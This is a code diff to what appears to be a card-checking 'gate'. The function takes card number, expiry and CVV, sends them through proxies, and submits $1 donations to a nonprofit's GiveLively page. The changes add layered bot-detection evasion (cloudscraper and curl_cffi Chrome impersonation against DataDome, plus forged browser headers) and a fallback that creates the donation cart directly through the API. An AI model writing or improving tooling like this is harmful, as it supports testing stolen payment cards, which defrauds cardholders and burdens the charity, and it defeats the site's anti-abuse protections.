@@ -25,6 +25,12 @@ try:
 except ImportError:
     HAS_CLOUDSCRAPER = False
 
+try:
+    from curl_cffi import requests as curl_requests
+    HAS_CURL_CFFI = True
+except ImportError:
+    HAS_CURL_CFFI = False
+
 # Gate config
 NSP_HOME = "https://www.nspnetwork.org/give"
 GIVELIVELY_BASE = "https://secure.givelively.org"
@@ -174,7 +180,11 @@ def _check_givelively_sync(card: str, mes: str, ano: str, cvv: str, proxy: str =
     try:
         mm = _normalize_month(mes)
         yy = _normalize_year(ano)
-        proxies = {"http://": proxy, "https://": proxy} if proxy else None
+        # Normalize proxy format
+        px = (proxy or "").strip()
+        if px and not px.startswith(("http://", "https://")):
+            px = f"http://{px}"
+        proxies = {"http://": px, "https://": px} if px else None
 
         with httpx.Client(
             timeout=TIMEOUT,
@@ -182,13 +192,13 @@ def _check_givelively_sync(card: str, mes: str, ano: str, cvv: str, proxy: str =
             proxies=proxies,
             headers={"User-Agent": USER_AGENT},
         ) as client:
-            # 1. GET nspnetwork.org/give (home)
+            # 1. GET nspnetwork.org/give (home) - establish referer
             try:
-                client.get(NSP_HOME)
+                client.get(NSP_HOME, headers={"User-Agent": USER_AGENT})
             except Exception:
                 pass
 
-            # 2. GET GiveLively donate page (try cloudscraper for DataDome bypass)
+            # 2. GET GiveLively donate page (cloudscraper first for DataDome bypass)
             donate_params = {
                 "recurring": "false",
                 "override_amount": "1",
@@ -200,31 +210,83 @@ def _check_givelively_sync(card: str, mes: str, ano: str, cvv: str, proxy: str =
                 "referrer_url": "",
                 "isWixEmbedded": "false",
             }
+            donate_headers = {
+                "User-Agent": USER_AGENT,
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+                "Accept-Language": "en-US,en;q=0.9",
+                "Referer": "https://www.nspnetwork.org/",
+                "sec-ch-ua": '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
+                "sec-ch-ua-mobile": "?0",
+                "sec-ch-ua-platform": '"Windows"',
+                "Upgrade-Insecure-Requests": "1",
+            }
             donate_html = None
             donate_url = None
             donate_cookies = {}
+            last_status = None
 
-            r_donate = client.get(GIVELIVELY_DONATE, params=donate_params)
-            if r_donate.status_code == 200 and len(r_donate.text or "") > 500:
-                donate_html = r_donate.text
-                donate_url = str(r_donate.url)
-                donate_cookies = dict(r_donate.cookies)
-            elif HAS_CLOUDSCRAPER:
+            # Try cloudscraper first (DataDome/Cloudflare bypass)
+            if HAS_CLOUDSCRAPER:
                 try:
                     scraper = cloudscraper.create_scraper(
                         browser={"browser": "chrome", "platform": "windows", "mobile": False}
                     )
                     if proxy:
                         scraper.proxies = {"http": proxy, "https": proxy}
-                    cs_resp = scraper.get(GIVELIVELY_DONATE, params=donate_params, timeout=TIMEOUT)
-                    if cs_resp.status_code == 200 and len(cs_resp.text or "") > 500:
+                    cs_resp = scraper.get(
+                        GIVELIVELY_DONATE,
+                        params=donate_params,
+                        headers=donate_headers,
+                        timeout=TIMEOUT,
+                    )
+                    last_status = cs_resp.status_code
+                    if cs_resp.status_code == 200 and len(cs_resp.text or "") > 300:
                         donate_html = cs_resp.text
                         donate_url = str(cs_resp.url)
                         donate_cookies = dict(cs_resp.cookies)
+                except Exception as ex:
+                    logger.debug("Cloudscraper donate fetch failed: %s", ex)
+
+            # Fallback: curl_cffi (Chrome impersonation, bypasses many bot checks)
+            if not donate_html and HAS_CURL_CFFI:
+                try:
+                    curl_proxies = (proxy or "").strip()
+                    curl_proxies = curl_proxies if curl_proxies else None
+                    curl_resp = curl_requests.get(
+                        GIVELIVELY_DONATE,
+                        params=donate_params,
+                        headers=donate_headers,
+                        timeout=TIMEOUT,
+                        impersonate="chrome120",
+                        proxies={"http": curl_proxies, "https": curl_proxies} if curl_proxies else None,
+                    )
+                    last_status = curl_resp.status_code
+                    if curl_resp.status_code == 200 and len(curl_resp.text or "") > 300:
+                        donate_html = curl_resp.text
+                        donate_url = str(curl_resp.url)
+                        donate_cookies = dict(curl_resp.cookies)
+                except Exception as ex:
+                    logger.debug("curl_cffi donate fetch failed: %s", ex)
+
+            # Fallback: httpx with full headers
+            if not donate_html:
+                try:
+                    r_donate = client.get(
+                        GIVELIVELY_DONATE,
+                        params=donate_params,
+                        headers=donate_headers,
+                    )
+                    last_status = r_donate.status_code
+                    if r_donate.status_code == 200 and len(r_donate.text or "") > 300:
+                        donate_html = r_donate.text
+                        donate_url = str(r_donate.url)
+                        donate_cookies = dict(r_donate.cookies)
                 except Exception:
                     pass
 
             if not donate_html:
+                if last_status and last_status != 200:
+                    return {"status": "error", "response": f"DONATE_PAGE_{last_status}"}
                 return {"status": "error", "response": "DONATE_PAGE_FAILED"}
 
             # Inject cookies from cloudscraper into client when cloudscraper was used
@@ -244,6 +306,33 @@ def _check_givelively_sync(card: str, mes: str, ano: str, cvv: str, proxy: str =
                 m = re.search(r'/cart/([a-f0-9-]{36})', donate_url, re.I)
                 if m:
                     cart_id = m.group(1)
+            # Fallback: try to create cart via API
+            if not cart_id:
+                try:
+                    create_headers = {
+                        "User-Agent": USER_AGENT,
+                        "Accept": "application/json",
+                        "Content-Type": "application/json",
+                        "Origin": GIVELIVELY_BASE,
+                        "Referer": f"{GIVELIVELY_BASE}/donate/national-safe-place-inc",
+                    }
+                    create_body = {
+                        "donation_page_context_id": parsed["donation_page_context_id"],
+                        "donation_page_context_type": "Nonprofit",
+                        "access_token": parsed["access_token"],
+                        "override_amount": 1,
+                        "recurring": False,
+                    }
+                    cr = client.post(
+                        f"{GIVELIVELY_BASE}/donate/national-safe-place-inc/carts",
+                        json=create_body,
+                        headers=create_headers,
+                    )
+                    if cr.status_code in (200, 201):
+                        cj = cr.json() if cr.text else {}
+                        cart_id = cj.get("id") or cj.get("cart_id")
+                except Exception:
+                    pass
             if not cart_id:
                 return {"status": "error", "response": "NO_CART_ID"}
 
